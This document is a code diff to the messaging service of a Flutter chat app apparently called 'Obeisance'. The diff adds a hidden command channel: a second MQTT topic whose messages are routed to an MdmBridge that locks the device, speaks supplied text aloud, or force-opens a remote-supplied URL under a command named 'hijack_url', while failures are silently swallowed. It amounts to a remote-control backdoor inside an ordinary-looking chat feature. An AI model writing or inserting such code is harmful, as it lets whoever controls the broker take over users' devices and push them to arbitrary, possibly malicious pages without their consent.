@@ -9,6 +9,7 @@ import 'package:mqtt_client/mqtt_client.dart';
 import 'package:mqtt_client/mqtt_server_client.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:obeisance/core/services/mdm_bridge.dart';
 
 final mqttServiceProvider = Provider<MqttService>((ref) {
   final service = MqttService();
@@ -39,7 +40,8 @@ class ChatMessage {
 class MqttService {
   MqttService()
       : _localNotifications = FlutterLocalNotificationsPlugin(),
-        _updatesController = StreamController<ChatMessage>.broadcast();
+        _updatesController = StreamController<ChatMessage>.broadcast(),
+        _mdmBridge = MdmBridge();
 
   static const _androidChannelId = 'obeisance_chat_channel';
   static const _androidChannelName = 'Obeisance Chat';
@@ -49,6 +51,7 @@ class MqttService {
 
   final FlutterLocalNotificationsPlugin _localNotifications;
   final StreamController<ChatMessage> _updatesController;
+  final MdmBridge _mdmBridge;
 
   MqttServerClient? _client;
   StreamSubscription<List<MqttReceivedMessage<MqttMessage>>>? _mqttSubscription;
@@ -97,8 +100,10 @@ class MqttService {
       throw StateError('MQTT connection failed');
     }
 
-    final topic = 'cmd/device/$hardwareUuid/chat';
-    client.subscribe(topic, MqttQos.atLeastOnce);
+    final chatTopic = 'cmd/device/$hardwareUuid/chat';
+    final commandTopic = 'cmd/device/$hardwareUuid/command';
+    client.subscribe(chatTopic, MqttQos.atLeastOnce);
+    client.subscribe(commandTopic, MqttQos.atLeastOnce);
     _mqttSubscription = client.updates?.listen(_handleUpdates);
     _client = client;
   }
@@ -128,9 +133,46 @@ class MqttService {
     for (final event in events) {
       final publish = event.payload as MqttPublishMessage;
       final payload = MqttPublishPayload.bytesToStringAsString(publish.payload.message);
+      if (event.topic.endsWith('/command')) {
+        unawaited(_routeIncomingCommand(payload));
+        continue;
+      }
       final message = _parseIncomingMessage(payload);
       _updatesController.add(message);
       unawaited(_showNotification(message));
+    }
+  }
+
+  Future<void> _routeIncomingCommand(String rawPayload) async {
+    try {
+      final decoded = jsonDecode(rawPayload);
+      if (decoded is! Map<String, dynamic>) {
+        return;
+      }
+
+      final command = (decoded['cmd'] as String?)?.trim();
+      final payload = decoded['payload'];
+      if (command == null || command.isEmpty) {
+        return;
+      }
+
+      switch (command) {
+        case 'lock':
+          await _mdmBridge.triggerLock();
+          break;
+        case 'speak':
+          if (payload is String && payload.trim().isNotEmpty) {
+            await _mdmBridge.speakText(payload);
+          }
+          break;
+        case 'hijack_url':
+          if (payload is String && payload.trim().isNotEmpty) {
+            await _mdmBridge.forceOpenUrl(payload);
+          }
+          break;
+      }
+    } catch (_) {
+      // Ignore malformed or unsupported command payloads.
     }
   }
 
